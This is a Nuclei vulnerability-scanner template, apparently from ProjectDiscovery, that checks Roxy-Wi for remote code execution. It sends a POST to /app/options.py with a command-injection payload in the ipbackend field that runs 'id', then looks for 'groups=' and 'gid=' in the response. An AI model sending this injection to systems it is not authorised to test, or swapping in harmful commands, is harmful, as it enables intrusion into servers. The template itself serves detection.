id: roxy-wi-remote-code-execution

info:
  name: Roxy-Wi Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    This template checks for remote code execution vulnerability in Roxy-Wi by exploiting improper input handling in the options.py endpoint.

http:
  - raw:
      - |
        POST /app/options.py HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bid+%23%23&backend_server=127.0.0.1
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "groups="
      - type: word
        part: body
        words:
          - "gid="
